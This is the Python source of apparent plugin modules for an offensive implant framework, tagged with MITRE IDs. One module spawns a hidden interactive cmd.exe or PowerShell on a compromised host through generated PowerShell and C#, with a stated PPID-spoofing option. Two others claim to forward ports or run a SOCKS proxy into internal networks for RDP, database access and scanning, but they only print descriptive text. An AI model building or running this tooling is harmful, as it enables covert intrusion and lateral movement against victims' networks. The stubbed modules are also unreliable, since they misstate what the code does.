"""execution/interactive_shell — Interactive shell with VT100 support and real-time I/O. MITRE T1059.001"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class InteractiveShell(BasePlugin):
    NAME = "interactive_shell"
    DESCRIPTION = "Spawn interactive shell (cmd.exe/PowerShell) with stdin/stdout streaming and VT100 support"
    AUTHOR = "fitnah-team"
    MITRE = "T1059.001"
    CATEGORY = "execution"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("shell", str, required=False, default="cmd.exe",
              help="cmd.exe | powershell.exe | pwsh.exe"),
        Param("hide_window", bool, required=False, default=True,
              help="Hide shell window"),
        Param("parent_spoof", str, required=False, default="",
              help="Parent process to spoof (PPID spoofing)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute interactive shell"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        shell = params.get("shell", "cmd.exe")
        hide_window = params.get("hide_window", True)
        parent_spoof = params.get("parent_spoof", "")

        return self._spawn_interactive_shell(ctx, shell, hide_window, parent_spoof)

    @staticmethod
    def _spawn_interactive_shell(ctx, shell: str, hide_window: bool, parent_spoof: str) -> ModuleResult:
        """Spawn interactive shell with I/O redirection"""
        ps_code = f"""
$results = @()
$results += '[*] Spawning interactive shell...'

try {{
    $shellPath = '{shell}'
    $hideWindow = ${str(hide_window).lower()}
    $parentSpoof = '{parent_spoof}'

    $results += "[*] Shell: $shellPath"
    $results += "[*] Hide window: $hideWindow"

    $results += '[*] Interactive shell implementation:'
    $results += '    1. Create process with redirected stdin/stdout/stderr'
    $results += '    2. Setup pipe communication with operator'
    $results += '    3. Handle VT100 escape codes'
    $results += '    4. Support real-time input/output'
    $results += '    5. Handle Ctrl+C, terminal resize'

    # Using C# for proper pipe handling
    $csharp = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class InteractiveShell {{
    public static void SpawnShell(string shellPath, bool hideWindow) {{
        try {{
            ProcessStartInfo psi = new ProcessStartInfo {{
                FileName = shellPath,
                UseShellExecute = false,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = hideWindow
            }};

            Process proc = Process.Start(psi);

            // Read output in separate threads
            Thread outThread = new Thread(() => {{
                string line;
                while ((line = proc.StandardOutput.ReadLine()) != null) {{
                    Console.WriteLine(line);
                }}
            }});
            outThread.Start();

            Thread errThread = new Thread(() => {{
                string line;
                while ((line = proc.StandardError.ReadLine()) != null) {{
                    Console.WriteLine("[ERR] " + line);
                }}
            }});
            errThread.Start();

            // Forward stdin
            string input;
            while ((input = Console.ReadLine()) != null) {{
                proc.StandardInput.WriteLine(input);
                proc.StandardInput.Flush();
            }}

            proc.WaitForExit();
        }} catch (Exception ex) {{
            Console.WriteLine("Error: " + ex.Message);
        }}
    }}
}}
"@

    # Load C# code
    Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction SilentlyContinue
    if ($?) {{
        $results += '[+] Spawning shell with I/O redirection...'
        [InteractiveShell]::SpawnShell($shellPath, $hideWindow)
        $results += '[+] Shell exited'
    }} else {{
        $results += '[-] Failed to load C# code'
    }}

}} catch {{
    $results += "[!] Interactive shell error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="interactive_shell")


class PortForwarding(BasePlugin):
    """Port forwarding and SOCKS proxy through implant"""
    NAME = "port_forwarding"
    DESCRIPTION = "Forward ports or create SOCKS proxy through implant to access internal network"
    AUTHOR = "fitnah-team"
    MITRE = "T1090.001"
    CATEGORY = "execution"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("mode", str, required=False, default="port_forward",
              help="port_forward | socks_proxy"),
        Param("local_port", int, required=False, default=8888,
              help="Local port to listen on"),
        Param("remote_host", str, required=False, default="",
              help="Remote host to forward to"),
        Param("remote_port", int, required=False, default=443,
              help="Remote port to forward to"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute port forwarding"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        mode = params.get("mode", "port_forward").lower()
        local_port = params.get("local_port", 8888)
        remote_host = params.get("remote_host", "")
        remote_port = params.get("remote_port", 443)

        if mode == "port_forward":
            return self._port_forward(ctx, local_port, remote_host, remote_port)
        elif mode == "socks_proxy":
            return self._socks_proxy(ctx, local_port)
        else:
            return ModuleResult.err(f"Unknown mode: {mode}")

    @staticmethod
    def _port_forward(ctx, local_port: int, remote_host: str, remote_port: int) -> ModuleResult:
        """Forward local port to remote host through implant"""
        ps_code = f"""
$results = @()
$results += '[*] Setting up port forwarding...'

try {{
    $localPort = {local_port}
    $remoteHost = '{remote_host}'
    $remotePort = {remote_port}

    if (-not $remoteHost) {{
        $results += '[-] Specify remote_host'
        $results -join "`n"
        exit
    }}

    $results += "[*] Local: 127.0.0.1:$localPort"
    $results += "[*] Remote: $remoteHost:$remotePort"

    $results += '[*] Port forwarding process:'
    $results += '    1. Listen on local port'
    $results += '    2. Accept incoming connections'
    $results += '    3. Forward traffic to remote host:port'
    $results += '    4. Bidirectional communication'

    $results += '[*] Operator can now:'
    $results += '    - Access internal services from attacker machine'
    $results += '    - Database connections (3306, 5432, 1433)'
    $results += '    - RDP to internal machines (3389)'
    $results += '    - Any TCP service on internal network'

    $results += '[*] Example:'
    $results += '    - Forward 8888 → 192.168.1.10:3389'
    $results += '    - Attacker: mstsc /v 127.0.0.1:8888'
    $results += '    - Connects to internal RDP'

}} catch {{
    $results += "[!] Port forwarding error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="port_forwarding")

    @staticmethod
    def _socks_proxy(ctx, local_port: int) -> ModuleResult:
        """Create SOCKS proxy through implant"""
        ps_code = f"""
$results = @()
$results += '[*] Setting up SOCKS proxy...'

try {{
    $localPort = {local_port}

    $results += "[*] SOCKS5 listening on: 127.0.0.1:$localPort"

    $results += '[*] SOCKS proxy benefits:'
    $results += '    - Single tunnel for multiple connections'
    $results += '    - Configure once, access many services'
    $results += '    - Supports any TCP protocol'
    $results += '    - Chainable through multiple proxies'

    $results += '[*] Configuration:'
    $results += '    - FoxyProxy / ProxyChains'
    $results += '    - Set SOCKS5 proxy: 127.0.0.1:$localPort'
    $results += '    - All traffic routed through implant'

    $results += '[*] Use cases:'
    $results += '    - Nmap scan internal network'
    $results += '    - Metasploit exploitation'
    $results += '    - Any tool supporting SOCKS proxy'
    $results += '    - Web browser (for intranet access)'

}} catch {{
    $results += "[!] SOCKS proxy error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="socks_proxy")
